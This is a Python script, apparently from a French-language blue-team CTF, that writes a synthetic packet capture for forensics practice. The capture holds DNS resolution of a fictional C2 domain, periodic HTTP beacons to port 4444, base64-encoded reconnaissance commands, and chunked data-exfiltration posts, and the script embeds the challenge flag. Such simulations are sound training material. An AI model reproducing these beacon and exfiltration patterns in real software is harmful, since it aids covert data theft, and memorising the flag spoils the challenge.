#!/usr/bin/env python3
"""
=============================================================================
  Blue Team CTF – Générateur de PCAP bonus
  Simule le trafic réseau C2 pour la corrélation forensique
=============================================================================
Génère un fichier PCAP contenant :
  - Beacon HTTP POST régulier vers le C2
  - Réponses du C2 avec commandes encodées
  - Exfiltration de données
  - Résolution DNS du domaine C2

Nécessite : scapy  (pip install scapy)
"""

import struct
import os
import sys
import time
import random
import base64
from datetime import datetime, timedelta

# ─── Configuration ─────────────────────────────────────────────────────────────

C2_DOMAIN = "c2.darkops-syndicate.net"
C2_IP     = "185.141.27.83"
C2_PORT   = 4444
VICTIM_IP = "192.168.1.47"
VICTIM_MAC = b"\x08\x00\x27\xab\xcd\xef"
GW_MAC     = b"\x52\x54\x00\x12\x35\x00"
DNS_SERVER = "192.168.1.1"

FLAG = "blue{m3m_f0r3ns1cs_v0l4t1l1ty_m4st3r}"


# ═══════════════════════════════════════════════════════════════════════════════
#   Générateur PCAP "pur" (sans dépendance Scapy)
#   Format PCAP : Global Header + Packets(Packet Header + Data)
# ═══════════════════════════════════════════════════════════════════════════════

# PCAP global header
PCAP_MAGIC   = 0xa1b2c3d4
PCAP_VERSION = (2, 4)
PCAP_SNAPLEN = 65535
PCAP_LINKTYPE = 1  # Ethernet


def pcap_global_header():
    return struct.pack("<IHHiIII",
        PCAP_MAGIC,
        PCAP_VERSION[0], PCAP_VERSION[1],
        0,            # thiszone
        0,            # sigfigs
        PCAP_SNAPLEN,
        PCAP_LINKTYPE
    )


def pcap_packet_header(ts_sec, ts_usec, caplen, origlen):
    return struct.pack("<IIII", ts_sec, ts_usec, caplen, origlen)


def build_ethernet(src_mac, dst_mac, ethertype=0x0800):
    return dst_mac + src_mac + struct.pack(">H", ethertype)


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def ip_to_bytes(ip_str):
    return bytes(int(x) for x in ip_str.split("."))


def build_ip_header(src_ip, dst_ip, protocol, payload_len):
    total_len = 20 + payload_len
    header = struct.pack(">BBHHHBBH",
        0x45,           # version + IHL
        0x00,           # DSCP/ECN
        total_len,
        random.randint(1, 65535),  # identification
        0x4000,         # flags + fragment offset (DF)
        64,             # TTL
        protocol,
        0,              # checksum placeholder
    ) + ip_to_bytes(src_ip) + ip_to_bytes(dst_ip)

    cs = checksum(header)
    header = header[:10] + struct.pack(">H", cs) + header[12:]
    return header


def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, payload, seq=1000, ack=1000, flags=0x18):
    tcp_header = struct.pack(">HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack,
        0x50,       # data offset (5 words)
        flags,      # PSH+ACK
        65535,      # window
        0,          # checksum (placeholder)
        0,          # urgent pointer
    )

    # Pseudo header for checksum
    pseudo = ip_to_bytes(src_ip) + ip_to_bytes(dst_ip)
    pseudo += struct.pack(">BBH", 0, 6, len(tcp_header) + len(payload))
    cs = checksum(pseudo + tcp_header + payload)
    tcp_header = tcp_header[:16] + struct.pack(">H", cs) + tcp_header[18:]

    ip_header = build_ip_header(src_ip, dst_ip, 6, len(tcp_header) + len(payload))
    return ip_header + tcp_header + payload


def build_udp_packet(src_ip, dst_ip, src_port, dst_port, payload):
    udp_len = 8 + len(payload)
    udp_header = struct.pack(">HHHH", src_port, dst_port, udp_len, 0)
    ip_header = build_ip_header(src_ip, dst_ip, 17, udp_len)
    return ip_header + udp_header + payload


def build_dns_query(domain, txid=0x1234):
    """Construit une requête DNS simple."""
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    parts = domain.split(".")
    qname = b""
    for part in parts:
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    question = qname + struct.pack(">HH", 1, 1)  # Type A, Class IN
    return header + question


def build_dns_response(domain, ip, txid=0x1234):
    """Construit une réponse DNS simple."""
    header = struct.pack(">HHHHHH", txid, 0x8180, 1, 1, 0, 0)
    parts = domain.split(".")
    qname = b""
    for part in parts:
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    question = qname + struct.pack(">HH", 1, 1)
    # Answer : pointer to qname + type A + class IN + TTL + data
    answer = struct.pack(">HHIH", 0xC00C, 1, 1, 300)
    answer += struct.pack(">H", 4) + ip_to_bytes(ip)
    return header + question + answer


def generate_pcap(output_dir):
    """Génère le fichier PCAP bonus."""
    os.makedirs(output_dir, exist_ok=True)
    pcap_path = os.path.join(output_dir, "network_capture.pcap")

    base_time = int(datetime(2026, 2, 20, 14, 23, 50).timestamp())
    packets = []

    # ── 1. Résolution DNS du C2 ──
    dns_query = build_dns_query(C2_DOMAIN, 0xABCD)
    dns_pkt = build_udp_packet(VICTIM_IP, DNS_SERVER, 54321, 53, dns_query)
    eth = build_ethernet(VICTIM_MAC, GW_MAC)
    packets.append((base_time, 0, eth + dns_pkt))

    dns_resp = build_dns_response(C2_DOMAIN, C2_IP, 0xABCD)
    dns_resp_pkt = build_udp_packet(DNS_SERVER, VICTIM_IP, 53, 54321, dns_resp)
    eth2 = build_ethernet(GW_MAC, VICTIM_MAC)
    packets.append((base_time, 500000, eth2 + dns_resp_pkt))

    # ── 2. Beacons HTTP POST vers le C2 ──
    seq = 1000
    ack = 1000
    for i in range(8):
        t = base_time + 2 + i * 30  # toutes les 30 secondes

        # Beacon POST
        beacon_data = f"POST /api/beacon HTTP/1.1\r\nHost: {C2_DOMAIN}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nContent-Type: application/octet-stream\r\nContent-Length: 64\r\n\r\n"
        beacon_body = base64.b64encode(f"BEACON|{VICTIM_IP}|admin|DESKTOP-F4K3LAB|{i}".encode()).decode()
        beacon_payload = (beacon_data + beacon_body).encode()

        tcp_pkt = build_tcp_packet(VICTIM_IP, C2_IP, 49847, C2_PORT, beacon_payload, seq, ack)
        eth_out = build_ethernet(VICTIM_MAC, GW_MAC)
        packets.append((t, 0, eth_out + tcp_pkt))
        seq += len(beacon_payload)

        # Réponse du C2
        if i < 4:
            cmd = random.choice(["whoami", "ipconfig /all", "systeminfo", "net user"])
        elif i == 4:
            cmd = "EXFIL_START"
        elif i == 7:
            cmd = f"CONFIG_UPDATE|flag={FLAG}"
        else:
            cmd = "SLEEP 30"

        resp_data = f"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nX-Request-ID: {random.randint(10000,99999)}\r\n\r\n"
        resp_body = base64.b64encode(cmd.encode()).decode()
        resp_payload = (resp_data + resp_body).encode()

        tcp_resp = build_tcp_packet(C2_IP, VICTIM_IP, C2_PORT, 49847, resp_payload, ack, seq)
        eth_in = build_ethernet(GW_MAC, VICTIM_MAC)
        packets.append((t, 800000, eth_in + tcp_resp))
        ack += len(resp_payload)

    # ── 3. Trafic d'exfiltration (port 8443) ──
    exfil_time = base_time + 150
    exfil_data = f"EXFIL|CONFIDENTIAL_PROJECT_OMEGA|user=admin|host=DESKTOP-F4K3LAB|data_size=15MB|flag_ref={FLAG}"
    exfil_payload = base64.b64encode(exfil_data.encode())

    for chunk_i in range(3):
        chunk = exfil_payload[chunk_i*50:(chunk_i+1)*50]
        http_exfil = f"POST /upload/{chunk_i} HTTP/1.1\r\nHost: {C2_IP}:{8443}\r\nContent-Length: {len(chunk)}\r\n\r\n".encode() + chunk
        tcp_exfil = build_tcp_packet(VICTIM_IP, C2_IP, 49902, 8443, http_exfil, 5000 + chunk_i * 200, 5000)
        eth_exfil = build_ethernet(VICTIM_MAC, GW_MAC)
        packets.append((exfil_time + chunk_i * 2, 0, eth_exfil + tcp_exfil))

    # ── Écriture du PCAP ──
    with open(pcap_path, "wb") as fp:
        fp.write(pcap_global_header())
        for ts_sec, ts_usec, pkt_data in packets:
            fp.write(pcap_packet_header(ts_sec, ts_usec, len(pkt_data), len(pkt_data)))
            fp.write(pkt_data)

    print(f"[+] PCAP généré : {pcap_path} ({len(packets)} paquets)")
    return pcap_path


# ═══════════════════════════════════════════════════════════════════════════════

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.dirname(script_dir)
    challenge_dir = os.path.join(project_dir, "challenge")

    print("=" * 60)
    print("  🌐 Blue Team CTF – Générateur PCAP Bonus")
    print("=" * 60)
    print()

    pcap_path = generate_pcap(challenge_dir)

    print()
    print("[✓] PCAP prêt !")
    print(f"    Analysez avec : wireshark {pcap_path}")
    print(f"    Ou : tshark -r {pcap_path} -Y 'tcp.port == 4444'")
    print()


if __name__ == "__main__":
    main()
